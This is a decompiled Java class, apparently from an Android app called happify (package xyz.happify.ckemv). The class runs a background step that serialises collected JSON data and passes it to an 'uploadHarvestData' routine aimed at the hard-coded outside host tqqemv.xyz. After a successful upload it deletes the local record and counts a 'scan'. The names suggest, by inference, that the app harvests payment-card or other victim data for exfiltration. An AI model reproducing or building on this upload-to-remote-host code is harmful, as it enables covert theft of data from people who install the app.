package B2;

import e2.AbstractC0139v;
import e2.B;
import e2.InterfaceC0137t;
import m0.z;
import org.json.JSONObject;
import xyz.happify.ckemv.MainActivity;
import xyz.happify.ckemv.Reporter;

/* loaded from: classes.dex */
public final class o extends Q1.g implements W1.p {

    /* renamed from: f, reason: collision with root package name */
    public int f89f;
    public final /* synthetic */ JSONObject g;
    public final /* synthetic */ String h;

    /* renamed from: i, reason: collision with root package name */
    public final /* synthetic */ MainActivity f90i;

    /* renamed from: j, reason: collision with root package name */
    public final /* synthetic */ long f91j;

    /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
    public o(JSONObject jSONObject, String str, MainActivity mainActivity, long j3, O1.d dVar) {
        super(2, dVar);
        this.g = jSONObject;
        this.h = str;
        this.f90i = mainActivity;
        this.f91j = j3;
    }

    @Override // Q1.b
    public final O1.d b(O1.d dVar, Object obj) {
        return new o(this.g, this.h, this.f90i, this.f91j, dVar);
    }

    @Override // W1.p
    public final Object e(Object obj, Object obj2) {
        return ((o) b((O1.d) obj2, (InterfaceC0137t) obj)).k(K1.h.f605a);
    }

    @Override // Q1.b
    public final Object k(Object obj) {
        P1.a aVar = P1.a.f784b;
        int i3 = this.f89f;
        if (i3 == 0) {
            z.m0(obj);
            Reporter reporter = Reporter.INSTANCE;
            String jSONObject = this.g.toString();
            X1.g.d(jSONObject, "toString(...)");
            if (d2.l.V(reporter.uploadHarvestData(jSONObject, this.h, "https://tqqemv.xyz"), "Success", false)) {
                MainActivity mainActivity = this.f90i;
                a aVar2 = mainActivity.f5247A;
                if (aVar2 == null) {
                    X1.g.h("dbHelper");
                    throw null;
                }
                aVar2.a(this.f91j);
                a aVar3 = mainActivity.f5247A;
                if (aVar3 == null) {
                    X1.g.h("dbHelper");
                    throw null;
                }
                aVar3.getWritableDatabase().execSQL("UPDATE stats SET total_scans = total_scans + 1 WHERE id = 1");
                l2.d dVar = B.f2767a;
                f2.d dVar2 = j2.o.f3534a;
                n nVar = new n(mainActivity, null);
                this.f89f = 1;
                if (AbstractC0139v.p(dVar2, nVar, this) == aVar) {
                    return aVar;
                }
            }
        } else {
            if (i3 != 1) {
                throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
            }
            z.m0(obj);
        }
        return K1.h.f605a;
    }
}
